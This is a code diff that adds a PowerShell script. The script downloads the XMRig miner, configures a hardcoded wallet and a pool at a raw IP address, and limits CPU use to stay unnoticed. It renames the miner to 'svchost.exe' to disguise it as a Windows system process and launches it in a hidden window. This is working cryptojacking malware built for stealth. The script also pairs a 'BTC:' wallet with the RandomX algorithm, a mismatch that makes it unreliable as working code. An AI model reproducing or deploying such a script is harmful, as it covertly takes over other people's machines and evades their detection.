@@ -1,0 +1,77 @@
+# Setup miner folder on C: (no admin needed)
+$minerFolder = "C:\Miners\xmrig"
+if (-not (Test-Path $minerFolder)) {
+    New-Item -ItemType Directory -Path $minerFolder | Out-Null
+}
+
+# Download XMRig only if not present
+$exeFolderName = "xmrig-6.21.0"
+$exePath = "$minerFolder\$exeFolderName\xmrig.exe"
+if (-not (Test-Path $exePath)) {
+    $zipPath = "$minerFolder\xmrig.zip"
+    Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip" -OutFile $zipPath
+    Expand-Archive -Path $zipPath -DestinationPath $minerFolder -Force
+    Remove-Item $zipPath
+}
+
+# Worker name & wallet
+$workerName = "worker1"  # Change per device if needed
+$wallet = "BTC:1H8fueovMvcQLArhxw7P4QZ3FAfhEZg7CB.$workerName"
+
+# Pool config (direct IP to avoid DNS issues)
+$pool = "159.203.162.18:3333"
+$password = "x"
+
+# Resource limiting
+$cpuCount = (Get-WmiObject -Class Win32_Processor).NumberOfLogicalProcessors
+$cpuThreads = [Math]::Max(1, [Math]::Floor($cpuCount * 0.2))  # 20% CPU threads
+
+$gpuPriority = 2  # Medium priority for GPU usage
+
+# Large pages flag (only if admin)
+function Test-IsAdmin {
+    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+    return $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
+}
+
+$largePagesFlag = ""
+if (Test-IsAdmin) {
+    $largePagesFlag = "--large-pages"
+} else {
+    Write-Host "Running without large pages (admin rights needed)."
+}
+
+# Log file path
+$logFile = "$minerFolder\miner.log"
+
+# Rename exe to svchost.exe to hide miner name
+$stealthExeName = "svchost.exe"
+$stealthExePath = "$minerFolder\$exeFolderName\$stealthExeName"
+
+if (-not (Test-Path $stealthExePath)) {
+    Copy-Item $exePath $stealthExePath -Force
+}
+
+# Build miner argument list
+$arguments = @(
+    "--algo randomx"
+    "--url $pool"
+    "--user $wallet"
+    "--pass $password"
+    "--cpu-threads $cpuThreads"
+    $largePagesFlag
+    "--print-time 60"
+    "--log-file $logFile"
+    "--donate-level 1"
+    "--no-color"
+    "--api-port 0"
+    "--cuda-priority $gpuPriority"
+)
+
+# Join arguments to single string
+$argString = $arguments -join " "
+
+# Start miner silently with renamed exe
+Start-Process -FilePath $stealthExePath -ArgumentList $argString -WindowStyle Hidden
+
+Write-Host "Miner started silently. Logs at: $logFile"
